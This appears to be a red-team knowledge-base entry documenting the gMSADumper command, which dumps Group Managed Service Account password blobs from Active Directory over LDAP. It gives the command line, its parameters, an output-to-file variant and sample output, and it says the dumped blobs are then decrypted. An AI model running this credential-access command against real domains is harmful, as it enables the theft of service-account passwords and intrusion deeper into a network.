---
type: command
executor: bash
data: python3 gMSADumper.py -u User -p Password1 -d domain.local
tags:
  - credential-access
  - enumeration
  - active-directory
platforms:
  - Linux
  - Windows
verified: true
validated: true
---

# Run gMSADumper to Dump GMSA Info

## Command

```bash
python3 gMSADumper.py -u User -p Password1 -d domain.local
```

## Description

This command runs the gMSADumper Python script to enumerate and extract Group Managed Service Account (GMSA) details from Active Directory via LDAP. It authenticates with domain credentials and dumps attributes like account names, managed password blobs, and delegation info. Useful for identifying high-value service accounts during domain enumeration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-u` | Username for AD authentication | Yes |
| `-p` | Password for the username | Yes |
| `-d` | Target domain name (e.g., domain.local) | Yes |

## Examples

### Basic Usage

```bash
python3 gMSADumper.py -u User -p Password1 -d domain.local
```

### Advanced Usage

Add output to file: `python3 gMSADumper.py -u User -p Password1 -d domain.local > gmsa_dump.txt`

## Expected Output

```
GMSA Account: svc_web$
Managed Password Blob: [Hex or Base64 encoded blob]
Delegated Computers: computer1, computer2
[... additional accounts]
```

The output lists GMSA accounts with their encrypted password blobs and related attributes. Parse this for blobs to decrypt manually.

## Related

- [[procedures/extract-gmsa-passwords-from-active-directory]]
- [[tools/gmsadumper]]
